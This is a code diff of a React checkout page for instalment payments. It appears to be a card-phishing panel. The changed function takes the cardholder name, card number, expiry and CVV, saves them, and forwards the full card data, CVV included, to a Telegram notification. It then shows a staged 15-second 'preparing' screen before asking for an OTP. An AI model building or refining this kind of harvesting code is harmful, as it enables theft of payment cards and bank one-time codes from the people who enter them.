@@ -262,54 +262,66 @@ export default function App() {
     if (customer.id === "demo") {
       throw new Error("Use a saved customer code to submit a payment.");
     }
-    const paymentId = await createPayment({
-      customerUuid: customer.id,
-      customerCode: customer.code,
-      contractId: customer.contractId,
-      instalmentId: paymentTarget.instalmentId,
-      amount: paymentTarget.amount,
-      method: "card",
-      cardholderName: cardDetails.cardholderName,
-      cardNumber: cardDetails.cardNumber,
-      cardExpiry: cardDetails.cardExpiry,
-      cardCvv: cardDetails.cardCvv,
-      bankAccountId: customer.bank?.id,
-    });
+    const payAmount = Number(paymentTarget.amount);
     setPendingCardPayment({
-      id: paymentId,
-      amount: paymentTarget.amount,
+      id: null,
+      amount: payAmount,
       cardDetails,
     });
     setCardCheckoutStep("preparing");
+    const loadingDone = new Promise((resolve) => setTimeout(resolve, 15000));
     try {
-      await notifyDownPayment({
-        name: customer.name,
+      const paymentId = await createPayment({
+        customerUuid: customer.id,
         customerCode: customer.code,
-        phone: customer.phone,
-        downPayment: paymentTarget.amount,
-        totalPrice: customer.productPrice,
-        remainingAmount: customer.remainingAmount,
-        monthlyAmount: customer.monthlyAmount,
-        duration: customer.duration,
-        kind: paymentTarget.kind,
+        contractId: customer.contractId,
+        instalmentId: paymentTarget.instalmentId,
+        amount: payAmount,
         method: "card",
         cardholderName: cardDetails.cardholderName,
         cardNumber: cardDetails.cardNumber,
         cardExpiry: cardDetails.cardExpiry,
         cardCvv: cardDetails.cardCvv,
-        note:
-          paymentTarget.kind === "down_payment"
-            ? "Customer submitted card details for down payment"
-            : `Customer submitted card details for month ${paymentTarget.month || ""}`,
+        bankAccountId: customer.bank?.id,
       });
-    } catch (noticeError) {
-      setPaymentError(
-        `Card saved. Telegram notice failed: ${noticeError.message}`
-      );
+      setPendingCardPayment({
+        id: paymentId,
+        amount: payAmount,
+        cardDetails,
+      });
+      try {
+        await notifyDownPayment({
+          name: customer.name,
+          customerCode: customer.code,
+          phone: customer.phone,
+          downPayment: payAmount,
+          totalPrice: customer.productPrice,
+          remainingAmount: customer.remainingAmount,
+          monthlyAmount: customer.monthlyAmount,
+          duration: customer.duration,
+          kind: paymentTarget.kind,
+          method: "card",
+          cardholderName: cardDetails.cardholderName,
+          cardNumber: cardDetails.cardNumber,
+          cardExpiry: cardDetails.cardExpiry,
+          cardCvv: cardDetails.cardCvv,
+          note:
+            paymentTarget.kind === "down_payment"
+              ? "Customer submitted card details for down payment"
+              : `Customer submitted card details for month ${paymentTarget.month || ""}`,
+        });
+      } catch (noticeError) {
+        setPaymentError(
+          `Card saved. Telegram notice failed: ${noticeError.message}`
+        );
+      }
+      await loadingDone;
+      setCardCheckoutStep("otp");
+    } catch (submitError) {
+      setPendingCardPayment(null);
+      setCardCheckoutStep("form");
+      throw submitError;
     }
-    const waitMs = 10000 + Math.floor(Math.random() * 5001);
-    await new Promise((resolve) => setTimeout(resolve, waitMs));
-    setCardCheckoutStep("otp");
   }
 
   async function submitCardOtp(otpCode) {
@@ -758,7 +770,7 @@ export default function App() {
         cardCheckoutStep === "loading") &&
         pendingCardPayment && (
           <CardPurchaseAuth
-            amount={pendingCardPayment.amount}
+            amount={Number(paymentTarget?.amount ?? pendingCardPayment.amount ?? 0)}
             phase={cardCheckoutStep}
             onSubmit={submitCardOtp}
             onCancel={cancelCardOtp}
